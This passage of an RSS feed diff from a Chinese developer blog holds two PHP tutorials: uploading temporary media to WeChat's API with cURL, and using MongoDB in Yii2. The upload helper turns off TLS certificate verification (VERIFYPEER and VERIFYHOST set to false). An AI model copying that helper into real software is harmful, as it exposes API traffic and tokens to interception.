+        <pubDate>Sat, 16 Apr 2022 00:26:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/ -&lt;blockquote&gt;
+&lt;p&gt;微信小程序直播提供了由服务端发起创建直播间的功能，然而其中包括直播间的封面图和分享海报，官方文档的&lt;a href=&#34;https://developers.weixin.qq.com/doc/offiaccount/Asset_Management/New_temporary_materials.html&#34;&gt;指引&lt;/a&gt;是通过临时素材的 media_id 来访问文件的，该接口请求方式为 http 的 POST/FORM ，即用 FORM 表单来上传一个多媒体文件，这里使用的是 php 的 Curl  请求工具类发起网络请求，用 CURLFile 封装表单的多媒体文件。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;下面是我在项目开发时使用的代码片段，第一部分是发送网络请求的工具函数：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;httpUploadFile&lt;/span&gt;( &lt;span style=&#34;color:#00688b&#34;&gt;$url&lt;/span&gt;,&lt;span style=&#34;color:#00688b&#34;&gt;$data&lt;/span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt; = curl_init();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span style=&#34;color:#00688b&#34;&gt;$url&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POST, &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POST, &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_CONNECTTIMEOUT, &lt;span style=&#34;color:#b452cd&#34;&gt;5&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYPEER, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;FALSE&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYHOST, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;false&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CURLOPT_POSTFIELDS,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#00688b&#34;&gt;$data&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b&#34;&gt;$headers&lt;/span&gt; = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;array&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b&#34;&gt;$headers&lt;/span&gt;[] = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Content-Type: multipart/form-data&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HTTPHEADER, &lt;span style=&#34;color:#00688b&#34;&gt;$headers&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#00688b&#34;&gt;$output&lt;/span&gt; = curl_exec(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_close(&lt;span style=&#34;color:#00688b&#34;&gt;$ch&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#00688b&#34;&gt;$output&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码片段其实是和普通的 Curl 发起 POST 是无差别的；需要注意的是，发送前，需要设置请求头为 &lt;code&gt;&#39;Content-Type: multipart/form-data&#39;&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;第二部分就是发送请求的 FORM 表单内容了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$data&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;media&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; CURLFile(realpath(&lt;span style=&#34;color:#00688b&#34;&gt;$file&lt;/span&gt;)),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的 media 就是接口需要的字段，因为本人的开发环境是 php7.4 所以必须要使用 CURLFile 封装发送的文件，这里调用类传递的第一个参数是文件的真实路径，同时他还能指定文件的 MineType，还有文件上传的名称；&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;4&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt; =&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  string(&lt;span style=&#34;color:#b452cd&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;image&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;media_id&amp;#39;&lt;/span&gt; =&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  string(&lt;span style=&#34;color:#b452cd&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;fOfJIy2-XlOS0HWDJcvEy1CAt4nRpphJUS2sIagHCcOnpGo8hN4dqHZ9ZlDzdlOg&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;created_at&amp;#39;&lt;/span&gt; =&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  int(&lt;span style=&#34;color:#b452cd&#34;&gt;1649911169&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;item&amp;#39;&lt;/span&gt; =&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面就是请求成功后返回的结果集了，然后本地就可以使用 media_id 来获取到资源文件了。&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/upload-asset-to-wechat/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Yii2使用技巧（二）- 在Yii上使用MongoDB</title>
+        <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-two/</link>
+        <pubDate>Mon, 21 Mar 2022 00:26:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-two/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/yii2-skills-part-two/ -&lt;blockquote&gt;
+&lt;p&gt;公司项目的主线业务使用的是 MySQL ，但是在日志系统使用的是非关系型数据库 MongoDB ，而 Yii2 本身的 Active Record 是支持的，所以使用技巧二将针对 Yii2 上 MongoDB 的使用方法做一系列讲解。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一下载安装-yii2-mongodb-拓展包&#34;&gt;一、下载安装 &lt;code&gt;Yii2-mongodb&lt;/code&gt; 拓展包&lt;/h2&gt;
+&lt;p&gt;根据拓展的简介，这个拓展包的功能就是作为 Yii2 和 mongoDB 的粘合剂，因此这个拓展包是必要的；在 Yii2 项目目录下，执行 &lt;code&gt;composer require yiisoft/yii2-mongodb&lt;/code&gt; ；或者在项目的“ composer.json ”文件中“ require ”项内加入 &lt;code&gt;&amp;quot;yiisoft/yii2-mongodb&amp;quot;: &amp;quot;~2.1.0&amp;quot;&lt;/code&gt; ，再执行 &lt;code&gt;composer update&lt;/code&gt; ，将拓展包安装包项目内。&lt;/p&gt;
+&lt;h2 id=&#34;二将组件添加到-yii-配置&#34;&gt;二、将组件添加到 &lt;code&gt;Yii&lt;/code&gt; 配置&lt;/h2&gt;
+&lt;p&gt;因为本人使用的是 basic 版，所以就直接在项目的 config/web.php 文件的 components 关联数组内添加一下代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mongodb&amp;#39;&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;yii\mongodb\Connection&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;dsn&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mongodb://localhost:27017/&amp;#39;&lt;/span&gt;.env(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;MONGODB_DATABASE&amp;#34;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;options&amp;#39;&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; =&amp;gt; env(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;MONGODB_USERNAME&amp;#34;&lt;/span&gt;),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; =&amp;gt; env(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;MONGODB_PASSWORD&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码是添加一个名为&lt;code&gt;mongodb&lt;/code&gt;的配置项，其中包括调用的类，链接地址，还有登录数据库的配置，其中相关的配置都是使用&lt;code&gt;.env&lt;/code&gt; 文件进行动态配置；完成上诉配置之后，在项目里就可以使用&lt;code&gt;Yii::$app-&amp;gt;mongodb&lt;/code&gt;来调用拓展提供的方法了。&lt;/p&gt;
+&lt;h2 id=&#34;三加入到代码生成器gii&#34;&gt;三、加入到代码生成器（Gii）&lt;/h2&gt;
+&lt;p&gt;加入到&lt;code&gt;Gii&lt;/code&gt;后就可以使用其创建基于&lt;code&gt;Active Record&lt;/code&gt;的模型类，更加方便于我们对集合进行增删查改的操作，接着第二步的同一个配置文件，在&lt;code&gt;return $config&lt;/code&gt;前加入如下配置：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$config&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bootstrap&amp;#39;&lt;/span&gt;][] = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gii&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$config&lt;/span&gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;modules&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;gii&amp;#39;&lt;/span&gt;] = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;yii\gii\Module&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// uncomment the following to add your IP if you are not connecting from localhost.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;allowedIPs&amp;#39;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;::1&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;generators&amp;#39;&lt;/span&gt;=&amp;gt;[
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mongoDbModel&amp;#39;&lt;/span&gt; =&amp;gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;\yii\mongodb\gii\model\Generator&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在配置的 bootstrap 内新增一个 gii，同时在 modules 内的 gii 指定为 gii 的模块，具体的类为&lt;code&gt;yii\gii\Module&lt;/code&gt;；&lt;/p&gt;
+&lt;p&gt;还有 allowedIPs ，是为了安全起见对访问的 IP 地址进行限制，只有被添加到该项的 IP 才能访问；&lt;/p&gt;
+&lt;p&gt;最后在生成器 generators 内，指定一个名为 mongoDbModel 的类为 &lt;code&gt;\yii\mongodb\gii\model\Generator&lt;/code&gt; ；&lt;/p&gt;
+&lt;p&gt;完成以上操作后，在本地打开 gii，就可以发现已经多了一项可以生成 MongoDB 模型的生成器了。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-03-22_01-15-47.png&#34; alt=&#34;Gii MongoDB模型生成器&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;四使用生成器生成集合模型&#34;&gt;四、使用生成器生成集合模型&lt;/h2&gt;
+&lt;p&gt;在完成第三步的情况下，点击 start ，进入到生成器界面，如图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-03-22_01-51-24.png&#34; alt=&#34;模型生成器选项&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Collection Name&lt;/code&gt; 这里填写的是集合的名称&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Database Name&lt;/code&gt; 这里填写的是数据库的名称&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Attribute List&lt;/code&gt; 这里填写文档的字段，多个字段使用逗号隔开（记得是半角下状态的），然后&lt;code&gt;_id&lt;/code&gt; 是不用手动添加的，生成器会自动补充的&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Model Class&lt;/code&gt; 这里填写的是模型的类名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Namespace&lt;/code&gt; 为类的命名空间，这里根据你项目安排&lt;/p&gt;
+&lt;p&gt;完成上述内容填写后，点击&lt;code&gt;Preview&lt;/code&gt;，再点击&lt;code&gt;Generate&lt;/code&gt;，就可以在对应的目录下生成模型文件了。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;五组件部分使用方法&#34;&gt;五、组件部分使用方法&lt;/h2&gt;
+&lt;p&gt;在集合没有创建&lt;code&gt; Active Record&lt;/code&gt;模型的情况下，可以使用第二步注入的组件来对集合进行一系列的增删改查操作，下列的方法都是基于&lt;code&gt;Yii::$app-&amp;gt;mongodb&lt;/code&gt;的，并且每次都需要指定到目标集合。&lt;/p&gt;
+&lt;p&gt;==以下的操作都是需要先指定数据库，再指定集合！==&lt;/p&gt;
+&lt;h3 id=&#34;1-插入一条数据&#34;&gt;1. 插入一条数据&lt;/h3&gt;
+&lt;p&gt;使用insert方法，传入一个关联数组，数组的键为集合的字段，返回的是一个BSON对象，是_id；
+代码块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;insert&lt;/span&gt;([  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;mike&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;,  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;hobby&amp;#39;&lt;/span&gt; =&amp;gt; json_encode([&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sport&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;basketball&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;music&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;jazz&amp;#39;&lt;/span&gt;])  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]);  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MongoDB\BSON\ObjectId&lt;span style=&#34;color:#228b22&#34;&gt;#1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [oid] =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;6291d18c4c1b00008d0033b1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2-插入多条数据&#34;&gt;2. 插入多条数据&lt;/h3&gt;
+&lt;p&gt;使用batchInsert方法，传入一个二维数组，第二维的每一项和插入一条数据的结构是一样的，返回的是一个带
+_id的数组；
+代码块&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
